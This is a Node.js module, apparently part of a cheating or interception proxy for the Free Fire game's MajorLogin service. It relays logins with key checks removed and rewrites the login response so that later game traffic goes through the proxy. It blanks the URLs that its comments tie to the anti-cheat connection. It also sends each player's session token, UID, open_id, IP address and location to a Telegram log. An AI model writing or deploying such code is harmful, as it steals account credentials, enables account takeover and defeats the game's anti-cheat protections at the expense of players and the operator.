'use strict';
// modules/majorlogin.js
// Key validation DIHAPUS — semua open_id langsung allowed

const https    = require('https');
const protobuf = require('protobufjs');
const path     = require('path');
const crypto   = require('crypto');
const tglog    = require('./tglog');
const { MY_IP } = require('../gamevar');

let MajorLoginRes = null;
let RAFIN         = null;

protobuf.load(path.join(__dirname, '..', 'MajorLoginRes.proto'))
    .then(root => {
        MajorLoginRes = root.lookupType('freefire.MajorLoginRes');
        RAFIN         = root.lookupType('freefire.RAFIN');
        const msg = '[MAJORLOGIN] Proto loaded OK';
        console.log(msg);
        tglog.send(`✅ <b>Server Start</b>\n${msg}`);
    })
    .catch(err => {
        const msg = `[MAJORLOGIN] Proto load FAILED: ${err.message}`;
        console.error(msg);
        tglog.send(`❌ <b>Proto FAILED</b>\n${msg}`);
    });

function decodeReqFields(buf) {
    const out = {};
    try {
        const reader = protobuf.Reader.create(buf);
        while (reader.pos < reader.len) {
            const tag      = reader.uint32();
            const fieldNum = tag >>> 3;
            const wireType = tag & 0x7;
            if (wireType === 0) {
                const long = reader.uint64();
                const val  = typeof long.toNumber === 'function' ? long.toNumber() : Number(long);
                if (fieldNum === 98) out.is_vpn = val;
            } else if (wireType === 2) {
                const bytes = reader.bytes();
                const str   = bytes.toString('utf8');
                if (fieldNum === 22)  out.open_id        = str;
                if (fieldNum === 23)  out.open_id_type   = str;
                if (fieldNum === 29)  out.access_token   = str.substring(0, 20) + '...';
                if (fieldNum === 57)  out.client_version = str;
                if (fieldNum === 83)  out.version_code   = str;
                if (fieldNum === 20)  out.client_ip      = str;
                if (fieldNum === 11)  out.network_type   = str;
            } else if (wireType === 5) { reader.fixed32();
            } else if (wireType === 1) { reader.fixed64();
            } else { break; }
        }
    } catch (_) {}
    return out;
}

const BAN_REASON_MAP = {
    0: 'UNKNOWN', 1: 'IN_GAME_AUTO', 2: 'REFUND',
    3: 'OTHERS',  4: 'SKINMOD',      1014: 'IN_GAME_AUTO_NEW'
};
function formatBlacklist(bl) {
    if (!bl || !bl.ban_reason) return null;
    const reason = BAN_REASON_MAP[bl.ban_reason] || `code_${bl.ban_reason}`;
    const exp    = bl.expire_duration ? `${bl.expire_duration}s` : 'permanent';
    return `🚫 BAN: ${reason} | expire: ${exp}`;
}
function formatQueue(q) {
    if (!q || q.allow) return null;
    return `⏳ QUEUE pos:${q.queue_position} wait:${q.need_wait_secs}s`;
}

function init(app) {
    app.post('/MajorLogin', (req, res) => {
        const body     = req.body;
        const rawIp    = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        const clientIp = rawIp.split(',')[0].trim().replace('::ffff:', '');

        const reqInfo = Buffer.isBuffer(body) && body.length > 0 ? decodeReqFields(body) : {};
        const openId  = reqInfo.open_id || null;

        // Semua open_id langsung diforward — tidak ada validasi key
        const options = {
            hostname: 'loginbp.ggpolarbear.com',
            path:     '/MajorLogin',
            method:   'POST',
            headers: {
                ...req.headers,
                'host':           'loginbp.ggpolarbear.com',
                'content-length': Buffer.isBuffer(body) ? body.length : 0
            }
        };
        delete options.headers['transfer-encoding'];

        const proxyReq = https.request(options, (proxyRes) => {
            const chunks = [];
            proxyRes.on('data', c => chunks.push(c));
            proxyRes.on('end', () => {
                const buf = Buffer.concat(chunks);

                if (!MajorLoginRes || !RAFIN) {
                    console.warn('[MAJORLOGIN] Proto not ready, passthrough');
                    res.writeHead(proxyRes.statusCode, proxyRes.headers);
                    return res.end(buf);
                }

                try {
                    // ── Decode sebagai RAFIN (full response) ──────────────────
                    // Response binary MajorLogin adalah RAFIN proto, bukan MajorLoginRes.
                    // MajorLoginRes hanya subset (key/iv/token) — decode keduanya.
                    const rafinDecoded = RAFIN.decode(buf);
                    const rafinObj     = RAFIN.toObject(rafinDecoded, { defaults: true, longs: String });

                    const mlDecoded = MajorLoginRes.decode(buf);
                    const mlObj     = MajorLoginRes.toObject(mlDecoded, { defaults: true });

                    const keyLen = (mlObj.key && mlObj.key.length) ? mlObj.key.length : 0;
                    const ivLen  = (mlObj.iv  && mlObj.iv.length)  ? mlObj.iv.length  : 0;

                    let modified = false;

                    // ── Patch key/iv kalau kosong ──────────────────────────────
                    if (keyLen === 0) { mlObj.key = crypto.randomBytes(16); modified = true; }
                    if (ivLen  === 0) { mlObj.iv  = crypto.randomBytes(16); modified = true; }

                    // ── PATCH KRITIS: server_url → proxy URL ───────────────────
                    // MajorLogin response berisi server_url=https://clientbp.ggpolarbear.com
                    // Game pakai server_url ITU untuk semua request berikutnya (GetLoginData dll)
                    // → Bypass proxy total! GIN bisa konek langsung → CLIENT_DATA_FORWARD → BL
                    // Fix: ganti server_url ke proxy kita supaya semua request lewat proxy
                    const proxyBase = MY_IP.replace(/\/$/, '');
                    const originalServerUrl = rafinObj.server_url || '';
                    if (originalServerUrl && originalServerUrl !== proxyBase) {
                        rafinObj.server_url = proxyBase;
                        modified = true;
                        console.log(`[MAJORLOGIN-PATCH] server_url: ${originalServerUrl} → ${proxyBase}`);
                    }

                    // ── Kosongkan tp_url / ffanti_url / ano_url ─────────────────
                    // tp_url dan ffanti_url berisi IP stronghold Garena untuk koneksi TCP Gin
                    // JANGAN di-redirect ke proxy — proxy tidak handle TCP Gin
                    // Solusi: kosongkan → game tidak bisa resolve target TCP Gin
                    if (rafinObj.tp_url     !== undefined) { rafinObj.tp_url     = ''; modified = true; }
                    if (rafinObj.ffanti_url !== undefined) { rafinObj.ffanti_url = ''; modified = true; }
                    if (rafinObj.ano_url    !== undefined) { rafinObj.ano_url    = ''; modified = true; }
                    console.log(`[MAJORLOGIN-PATCH] tp_url/ffanti_url/ano_url dikosongkan`);

                    const uid    = rafinObj.account_id || '?';
                    const region = rafinObj.lock_region || '?';

                    // ── Kirim data akun ke Telegram ──────────────────────────
                    const status = modified ? '🔑 PATCHED' : '✅ LOGIN OK';
                    const lines  = [`<b>MajorLogin — ${status}</b>`, ''];
                    lines.push(`👤 UID: <code>${uid}</code>`);
                    lines.push(`🆔 open_id: <code>${openId || '?'}</code>`);
                    if (reqInfo.open_id_type) lines.push(`🔖 id_type: ${reqInfo.open_id_type}`);
                    lines.push(`🌏 region: ${region}`);
                    lines.push(`📍 lokasi: ${rafinObj.ip_city || '?'}, ${rafinObj.ip_subdivision || '?'}`);
                    lines.push(`🌐 ip: ${clientIp}`);
                    if (reqInfo.client_version) lines.push(`📱 ver: ${reqInfo.client_version}`);
                    if (reqInfo.network_type)   lines.push(`📶 net: ${reqInfo.network_type}`);
                    if (reqInfo.is_vpn !== undefined) lines.push(`🔒 vpn: ${reqInfo.is_vpn}`);
                    lines.push(`🎫 token: <code>${rafinObj.token || '?'}</code>`);
                    lines.push(`🔗 server: ${originalServerUrl} → ${proxyBase}`);
                    if (rafinObj.ttl)        lines.push(`⏱ ttl: ${rafinObj.ttl}s`);
                    lines.push(`🔐 key: ${keyLen}B${keyLen === 0 ? ' → injected' : ''}`);
                    lines.push(`🔐 iv:  ${ivLen}B${ivLen  === 0 ? ' → injected' : ''}`);
                    const banStr   = rafinObj.blacklist  ? formatBlacklist(rafinObj.blacklist)  : null;
                    const queueStr = rafinObj.queue_info ? formatQueue(rafinObj.queue_info)      : null;
                    if (banStr)   { lines.push(''); lines.push(banStr); }
                    if (queueStr) { lines.push(''); lines.push(queueStr); }

                    console.log(`[MAJORLOGIN] OK uid=${uid} open_id=${openId} region=${region} key=${keyLen}B modified=${modified}`);
                    tglog.send(lines.join('\n'));

                    if (modified) {
                        // Encode ulang RAFIN dengan server_url yang sudah dipatch
                        // MajorLoginRes (key/iv) ikut di-encode dalam RAFIN karena field 22/23 sama
                        // Tapi RAFIN proto kita tidak punya field key/iv → encode dua kali dan merge
                        // Lebih aman: patch RAFIN untuk server_url, patch MajorLoginRes untuk key/iv
                        // lalu merge binary (proto merge = union of fields, safe karena field num berbeda)

                        let outBuf = buf; // default fallback

                        try {
                            // Encode RAFIN patch (server_url, tp_url, ano_url)
                            const rafinErrMsg = RAFIN.verify(rafinObj);
                            if (!rafinErrMsg) {
                                const rafinBuf = RAFIN.encode(RAFIN.create(rafinObj)).finish();

                                // Kalau key/iv juga perlu diinject, encode MajorLoginRes patch juga
                                if (keyLen === 0) {
                                    const mlErrMsg = MajorLoginRes.verify(mlObj);
                                    if (!mlErrMsg) {
                                        const mlBuf = MajorLoginRes.encode(MajorLoginRes.create(mlObj)).finish();
                                        // Proto merge: gabungkan dua buffer (field berbeda, tidak overlap)
                                        outBuf = Buffer.concat([rafinBuf, mlBuf]);
                                    } else {
                                        outBuf = rafinBuf;
                                    }
                                } else {
                                    outBuf = rafinBuf;
                                }
                            }
                        } catch (encErr) {
                            console.error('[MAJORLOGIN] Encode error:', encErr.message);
                            outBuf = buf; // fallback ke original kalau encode gagal
                        }

                        const newHeaders = { ...proxyRes.headers, 'content-length': outBuf.length };
                        delete newHeaders['transfer-encoding'];
                        res.writeHead(proxyRes.statusCode, newHeaders);
                        return res.end(outBuf);
                    }

                    res.writeHead(proxyRes.statusCode, proxyRes.headers);
                    res.end(buf);

                } catch (err) {
                    console.error('[MAJORLOGIN] Decode error:', err.message);
                    tglog.send(`❌ <b>MajorLogin Decode Error</b>\n${err.message}\nip: ${clientIp}`);
                    res.writeHead(proxyRes.statusCode, proxyRes.headers);
                    res.end(buf);
                }
            });
        });

        proxyReq.on('error', err => {
            console.error('[MAJORLOGIN] Proxy error:', err.message);
            tglog.send(`❌ <b>MajorLogin Proxy Error</b>\n${err.message}`);
            if (!res.headersSent) res.status(502).send('MajorLogin Proxy Error');
        });

        if (Buffer.isBuffer(body) && body.length > 0) proxyReq.write(body);
        proxyReq.end();
    });

    console.log('[MAJORLOGIN] Active → loginbp.ggpolarbear.com (no key validation)');
}

module.exports = { init };
